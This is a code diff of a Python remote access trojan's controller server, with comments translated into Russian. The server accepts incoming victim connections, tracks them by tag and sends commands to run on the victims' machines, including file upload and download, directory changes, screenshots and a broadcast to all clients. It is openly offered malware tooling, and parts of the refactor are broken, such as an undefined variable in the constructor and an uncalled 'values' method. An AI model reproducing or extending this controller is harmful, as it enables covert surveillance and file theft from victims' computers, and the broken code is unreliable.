@@ -1,7 +1,6 @@
-from multiprocessing import connection
 import socket, json, base64
 
-# Set the commands as a 2D array with descriptions for modularity
+# Список команд с описанием, в виде 2д массива
 commands = [
     ["exit", "Exits the connection on both sides"],
     ["cd", "Changes the active directory"],
@@ -15,10 +14,12 @@ commands = [
     ["screen", "makes screenshot"],
 ]
 
+# выводит список доступных команд
 def helpCommand():
+    """Выводит список доступных команд с описанием"""
     total = 0
     result = "\nCommands: \n"
-    # Simple loop to send a description of all commands
+    # Добавление описания каждой команды
     for x in commands:
         result = result + "\n" + f"[{total}] {commands[total][0]} - {commands[total][1]}"
         total += 1
@@ -26,52 +27,68 @@ def helpCommand():
     return result
 
 class ManyServers:
-    servers_count = []
+    """Класс Сервера, который позволяет оперировать с множеством подключений к клиентам."""
     def __init__(self):
-        import config
-        server = Server(config.SERVER_IP, config.SERVER_PORT)
-        self.servers_ips = {}
-        self.servers_ips.update({self.__add_server_to_count(): [server.tag, server]})
+        # import config
+        # server = Server(config.SERVER_IP, config.SERVER_PORT)
+        # список тегов активных серверов
+        self.__servers_count: list[int] = []
+        self.__servers_ips = {}
+        self.__servers_ips.update({self.__add_server_to_count(): [server.tag, server]})
     
     def __add_server_to_count(self):
         i = 0
         while True:
-            if i not in ManyServers.servers_count:
-                ManyServers.servers_count.append(i)
+            if i not in ManyServers.__servers_count:
+                ManyServers.__servers_count.append(i)
                 return i
             i += 1
     
     def add_connection(self):
+        """Мониторинг новых подключений, если появляется запрос от нового клиента, принимает его"""
         import config
+        # принятие запроса на подключение от клиента
         server = Server(config.SERVER_IP, config.SERVER_PORT)
-        print(server.tag)
-        print("server")
-        print("do update", self.servers_ips)
-        self.servers_ips.update({self.__add_server_to_count(): [server.tag, server]})
-        print("posle update", self.servers_ips)
+        # добавление нового подключения в список всех подключений
+        self.__servers_ips.update({self.__add_server_to_count(): [server.tag, server]})
+        # повторный вызов для бесконечного мониторинга
         self.add_connection()
     
     def view_all_servers(self):
+        """Возвращает список активных подключений"""
         s = ""
-        for i in self.servers_ips.keys():
-            print(self.servers_count)
-            s = s + str(i) + ". " + str(self.servers_ips[i][0]) + "\n"
+        for i in self.__servers_ips.keys():
+            print(self.__servers_count)
+            s = s + str(i) + ". " + str(self.__servers_ips[i][0]) + "\n"
         return s
     
     async def make_command_to_server(self, command):
-        tag = int(command.split()[0])
-        if self.servers_ips.get(tag, "no") == "no":
+        """Создание запроса к клиенту или клиентам по тегу. Если тег = all, отправляет запрос всем клиентам"""
+        # @todo many tags
+        tag = command.split()[0]
+        # обработка сценария с тегом all
+        if tag == "all":
+            for i in self.__servers_ips.values:
+                i: Server = i[1]
+                # проверка занятости клиента другим запросом
+                if i.in_process:
+                    continue
+                i.step()
+        # проверка наличия подключения с полученным тегом
+        elif self.__servers_ips.get(tag, "no") == "no":
             return f"exist not connection with name: {tag}"
-        elif self.servers_ips[tag][1].in_process:
+        # проверка занятости клиента другим запросом
+        elif self.__servers_ips[tag][1].in_process:
             return f"{tag} connection already in process"
+        # выполнение запроса определенным клиентом
         else:
-            # @todo all
             command = command.split()[1:]
-            res = self.servers_ips[tag][1].step(command)
+            res = self.__servers_ips[tag][1].step(command)
             return res
 
 
 class Server:
+#public:
     def __init__(self, ip, port):
         self.in_process = False
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -83,43 +100,70 @@ class Server:
         self.tag = address[0]
         print("[+] Connection received from " + str(address))
         # helpCommand()
+        
+    def step(self, command):
+        # command = command.split(" ", 1)
+        try:
+            if command[0] == "upload":
+                fileContent = self.__readFile(command[1]).decode()
+                command.append(fileContent)
+            result = self.__executeRemotely(command)
+            if command[0] == "download" and "[-] Error" not in result:
+                result = self.__writeFile(command[1], result)
+            if command[0] == "screenshot" and "[-] Error" not in result:
+                result = self.__screenshot(result)
+            elif command[0] == "ratHelp":
+                result = helpCommand()
+        except Exception:
+            result = "[-] Error running command, check the syntax of the command."
+        return result
 
-    def dataReceive(self):
-        jsonData = b""
-        while True:
-            try:
-                jsonData += self.connection.recv(1024)
-                return json.loads(jsonData)
-            except ValueError:
-                continue
+# private:    
+    # def __dataReceive(self):
+    #     jsonData = b""
+    #     while True:
+    #         try:
+    #             jsonData += self.connection.recv(1024)
+    #             return json.loads(jsonData)
+    #         except ValueError:
+    #             continue
 
-    def dataSend(self, data):
-        jsonData = json.dumps(data)
-        self.connection.send(jsonData.encode())
+    # def __dataSend(self, data):
+    #     jsonData = json.dumps(data)
+    #     self.connection.send(jsonData.encode())
 
-    def executeRemotely(self, command):
-        self.send_json(command)
+    # выполнение команды в консоли клиента
+    def __executeRemotely(self, command):
+        """выполнение команды в консоли клиента"""
+        self.__send_json(command)
         if command[0] == "exit":
             self.connection.close()
             exit()
-        return self.receive_json()
+        return self.__receive_json()
 
-    def readFile(self, path):
+    # чтение файла
+    def __readFile(self, path):
+        """чтение файла"""
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
 
-    def writeFile(self, path, content):
+    # создание файла
+    def __writeFile(self, path, content):
+        """создание файла"""
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Download complete"
     
-    def screenshot(self, content):
+    # делает скриншот на клиенте
+    def __screenshot(self, content):
+        """делает скриншот на клиенте"""
         with open("screen.png", "wb") as file:
             file.write(base64.b64decode(content))
         return ("[+] screen complete",)
     
     # Отправка json-данных клиенту
-    def send_json(self, data):     
+    def __send_json(self, data):
+        """Отправка json-данных клиенту"""
         # Обрабатываем бинарные данные
         try: json_data = json.dumps(data.decode('utf-8'))
         except: json_data = json.dumps(data)
@@ -133,7 +177,8 @@ class Server:
 
 
     # Получаем json данные от клиента
-    def receive_json(self):
+    def __receive_json(self):
+        """Получение json данные от клиента"""
         json_data = ''
         while True:
             try:
@@ -144,20 +189,3 @@ class Server:
                     return None
             except ValueError:
                 pass
-        
-    def step(self, command):
-        # command = command.split(" ", 1)
-        try:
-            if command[0] == "upload":
-                fileContent = self.readFile(command[1]).decode()
-                command.append(fileContent)
-            result = self.executeRemotely(command)
-            if command[0] == "download" and "[-] Error" not in result:
-                result = self.writeFile(command[1], result)
-            if command[0] == "screenshot" and "[-] Error" not in result:
-                result = self.screenshot(result)
-            elif command[0] == "ratHelp":
-                result = helpCommand()
-        except Exception:
-            result = "[-] Error running command, check the syntax of the command."
-        return result
